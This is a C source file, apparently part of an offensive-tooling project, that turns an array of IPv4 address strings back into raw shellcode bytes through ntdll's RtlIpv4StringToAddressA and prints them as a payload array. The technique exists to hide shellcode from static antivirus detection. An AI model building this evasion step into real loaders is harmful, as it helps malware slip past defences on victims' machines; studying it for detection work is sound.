#include "glassBox.h"

typedef NTSTATUS(NTAPI* fnRtlIpv4StringToAddressA)(
	PCSTR	S,
	BOOLEAN Strict,
	PCSTR* Terminator,
	PVOID	Addr
	);

BOOL Ipv4Deobfuscation(IN CHAR* ipv4Array[], IN SIZE_T NmbrOfElements, IN SIZE_T OriginalPayloadSize, OUT PBYTE* ppDAdderss, OUT SIZE_T* pDsize) {
	PBYTE	pBuffer = NULL,
		TmpBuffer = NULL;
	SIZE_T sBuffSize = 0;
	PCSTR Terminator = NULL;
	NTSTATUS STATUS = 0;

	// Getting RtlIpv4StringToAddressA address from ntdll.dll
	fnRtlIpv4StringToAddressA pRtlIpv4StringToAddressA = (fnRtlIpv4StringToAddressA)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "RtlIpv4StringToAddressA");

	if (pRtlIpv4StringToAddressA == NULL) {
		warn("GetProcAddress Failed with Error : %d \n", GetLastError());
		return EXIT_FAILURE;
	}

	// Getting the real size of the payload which is the number of IPv4 addresses * 4
	sBuffSize = NmbrOfElements * 4;

	// Allocating memory which will hold the deobfuscated code
	pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
	if (pBuffer == NULL) {
		warn("HeapAlloc Failed with Error: %d \n", GetLastError());
		return EXIT_FAILURE;
	}

	TmpBuffer = pBuffer;

	// Loop through all the IPv4 addresses saved in IPv4Array

	for (int i = 0; i < NmbrOfElements; i++) {

		// Deobfuscating one IPv4 at a time
		// Ipv4Array[i] is a single IPv4 address from array Ipv4Array
		if ((STATUS = pRtlIpv4StringToAddressA(ipv4Array[i], FALSE, &Terminator, TmpBuffer)) != 0x0) {
			warn("RtlIpv4StringToAddressA Failed at [%s] With Error 0x%0.0.8X", ipv4Array[i], STATUS);
			return EXIT_FAILURE;
		}

		// 4 bytes are written to tmpbuffer at a tim
		// Therefore Tmpbuffer will be incremented by 4 to store the upcoming 4 bytes
		TmpBuffer = (PBYTE)(TmpBuffer + 4);

	}

	// Save the base addresses & size of the deobfuscated payload

	*ppDAdderss = pBuffer;
	*pDsize = OriginalPayloadSize;

	info("Decoded bytes: \n");

	okay("unsigned char payload[] = ");

	for (SIZE_T i = 0; i < *pDsize; i++) {

		if (i % 16 == 0)
			printf("\"");

		printf("\\x%02x", pBuffer[i]);

		if ((i + 1) % 16 == 0 || i == sBuffSize - 1)
			printf("\"\n");
	}

	printf("\n");

	return TRUE;
}